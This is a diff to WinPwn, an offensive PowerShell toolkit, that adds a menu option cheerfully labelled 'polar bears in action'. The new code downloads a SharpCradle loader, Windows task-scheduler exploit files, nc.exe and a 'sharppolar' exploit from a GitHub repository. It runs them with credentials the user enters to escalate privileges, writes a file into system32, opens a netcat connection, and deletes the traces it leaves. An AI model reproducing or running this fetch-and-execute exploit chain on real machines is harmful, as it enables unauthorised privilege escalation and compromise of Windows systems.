@@ -105,6 +105,8 @@ function sharpcradle{
     (
         [bool]
         $allthosedotnet
+	[bool]
+        $polar
     )
     pathcheck
     $currentPath = (Get-Item -Path ".\" -Verbose).FullName
@@ -149,6 +151,37 @@ function sharpcradle{
         }
 		del .\cradle.exe
 	    
+    }
+    if ($polar)
+    {
+    	if ([Environment]::Is64BitProcess)
+    	{
+       	    [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
+       	    Invoke-Webrequest -Uri https://github.com/SecureThisShit/Creds/blob/master/Ghostpack/SharpCradle.exe?raw=true -Outfile $currentPath\cradle.exe
+       	}
+    	else
+    	{
+       	    [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
+       	    Invoke-Webrequest -Uri https://github.com/SecureThisShit/Creds/blob/master/Ghostpack/SharpCradle2.exe?raw=true -Outfile $currentPath\cradle.exe
+       	}
+    	$polaraction = Read-Host -Prompt 'Do you have a valid username and password to elevate privileges?'
+	if ($polaraction -eq "yes" -or $polaraction -eq "y" -or $polaraction -eq "Yes" -or $polaraction -eq "Y")
+	{
+		$username = Read-Host -Prompt 'Please enter the username'
+		$password = Read-Host -Prompt 'Please enter the password'
+		[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
+		Invoke-Webrequest -Uri https://github.com/SecureThisShit/Creds/raw/master/exeFiles/winexploits/schedsvc.dll -Outfile $currentPath\schedsvc.dll
+		Invoke-Webrequest -Uri https://github.com/SecureThisShit/Creds/raw/master/exeFiles/winexploits/schtasks.exe -Outfile $currentPath\schtasks.exe
+		Invoke-Webrequest -Uri https://github.com/SecureThisShit/Creds/raw/master/exeFiles/winexploits/test.job -Outfile $currentPath\test.job
+		Invoke-Webrequest -Uri https://github.com/SecureThisShit/Creds/raw/master/exeFiles/winexploits/nc.exe -Outfile C:\temp\nc.exe
+		.\cradle.exe -w https://github.com/SecureThisShit/Creds/raw/master/exeFiles/winexploits/sharppolar.exe license.rtf $username $password
+		cmd /c start powershell -Command {C:\temp\nc.exe 127.0.0.1 2000}
+		move env:USERPROFILE\Appdata\Local\temp\license.rtf C:\windows\system32\license.rtf
+		del .\cradle.exe
+		del .\schedsvc.dll
+		del .\schtasks.exe
+		del C:\windows\system32\tasks\test
+	}
     }
     elseif ([Environment]::Is64BitProcess)
     {
@@ -1481,7 +1514,8 @@ __        ___       ____
         Write-Host -ForegroundColor Green '18. Find some network shares! '
 	Write-Host -ForegroundColor Green '19. Execute some C# Magic for Creds, Recon and Privesc!'
 	Write-Host -ForegroundColor Green '20. Load custom C# Binaries from a webserver to Memory and execute them!'
-        Write-Host -ForegroundColor Green '21. Exit. '
+	Write-Host -ForegroundColor Green '21. Show some polar bears in action!'
+        Write-Host -ForegroundColor Green '22. Exit. '
         Write-Host "================ WinPwn ================"
         $masterquestion = Read-Host -Prompt 'Please choose wisely, master:'
 
@@ -1507,9 +1541,10 @@ __        ___       ____
             18{sharenumeration}
 	    19{sharpcradle -allthosedotnet $true}
 	    20{sharpcradle}
+	    21{sharpcradle -polar $true}
        }
     }
- While ($masterquestion -ne 21)
+ While ($masterquestion -ne 22)
      
     
     #End
